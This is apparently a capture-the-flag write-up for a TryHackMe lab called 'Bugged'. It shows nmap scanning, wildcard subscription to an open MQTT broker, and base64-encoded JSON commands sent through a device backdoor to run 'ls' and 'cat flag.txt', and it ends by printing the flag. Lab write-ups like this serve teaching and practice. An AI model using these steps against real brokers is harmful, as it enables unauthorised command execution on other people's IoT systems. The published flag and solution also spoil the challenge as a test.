This file describes all steps of execution for THM room (Bugged)
Difficulty - Easy

We start as usual with nmap scan

` sudo nmap -T4 -p- -A 10.114.175.47 `

Mostly we get usual information but interesting founding was
opened 1883 port.

With a little checkup on the internet 1883 seems to be some kind
open-source message broker - in other words mosquitto MQTT protocol.

MQTT (Message Queuing Telemetry Transport) is a lightweight messaging protocol used for IoT devices to send and
receive data over the internet. It uses a publish/subscribe model, where devices publish messages to a broker, and
other devices subscribe to topics to receive those messages. It is fast, efficient, and works well on low-bandwidth
networks.

With the nmap scan we did, we see some publishers sending information from
basic IoT devices, like sensors, appliances, etc:

kitchen/toaster: {"id":11066945492750934780,"in_use":true,"temperature":156.29333,"toast_time":265}
storage/thermostat: {"id":429708233957370398,"temperature":23.06692}

and more...

But... we need more information to be sent from these publishers through our MQTT broker
so we see more of this traffic.

We can use this command:

` mosquitto_sub -t '#' -h 10.114.175.47 `

We start recieving more info from each publisher but something caught my eye that seemed unusual.

This specific data sent:

{
  "id":5397677949173218433,
  "color":"WHITE",
  "status":"OFF"
} eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ==

We see a nicely looking base64 hash.

Let's decode it via echo 'hash' | base64 -d

We get:

{
  "id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d",
  "registered_commands":["HELP","CMD","SYS"],
  "pub_topic":"U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub",
  "sub_topic":"XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"
}

That seems to be configuration or discovery response that tells us how to interact with the service.

Okay now we have something that we could use to simulate traffic from publisher to subscriber!

We can try something with this command:

` mosquitto_sub -t 'U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub' -h 10.114.175.47 `

This command now listens to information coming from the publisher.

We can try and send the suspect traffic from the publishers.

` mosquitto_pub -h 10.114.175.47 -t 'XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub' -m test_msg `

When we go back to the listener we see the test_msg showed as:

SW52YWxpZCBtZXNzYWdlIGZvcm1hdC4KRm9ybWF0OiBiYXNlNjQoeyJpZCI6ICI8YmFja2Rvb3IgaWQ+IiwgImNtZCI6ICI8Y29tbWFuZD4iLCAiY
JnIjogIjxhcmd1bWVudD4ifSk=

We can try now and decode it once again.

After running echo 'hash' | base64 -d

we get an output:

Invalid message format.
Format: base64({"id": "<backdoor id>", "cmd": "<command>", "arg": "<argument>"}) 

That seems to be telling us the correct way of using the format of decoding.
Let's try it?

As of previous information we already have the "id", "cmd" commands and arg as of what command
we could use. That's a great advantage if we play our cards well.

Let's try decoding to base64 this:

` {"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "CMD", "arg": "ls"} `

We use it like this, because we know we have CMD commands and I want to try
if we can see any directories or files we can poke into.

Okay perfect, we used an online decoder and we decrypted it to base64 and we got:

` eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAibHMifQ== `

We can try and maybe walk it through the MQTT broker?

` mosquitto_pub -h 10.114.175.47 -t 'XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub' -m
'eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAibHMifQ==' `

Super! We got another hash and that one is a BIG CLUE:

` {"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","response":"flag.txt\n"} `

We literally see a text file with the flag in the response section, all we need to do now is to
get inside of it.

Before that - we have to decode this one into base64 again and maybe run in through the MQTT Broker again.

After decoding we get:

` eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAiY2F0IGZsYWcudHh0In0= `

and after MQTT Broker we finally get:

` eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiZmxhZ3sxOGQ0NGZjMDcwN2FjOGRjOGJlNDViYjgzZGI1NDAxM31cbiJ9 `

Let's decode this for the last time with echo 'hash' | base64 -d

and our flag is revealed!

<details>
<summary>Spoiler Alert!</summary>

{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","response":"flag{18d44fc0707ac8dc8be45bb83db54013}\n"}

</details>
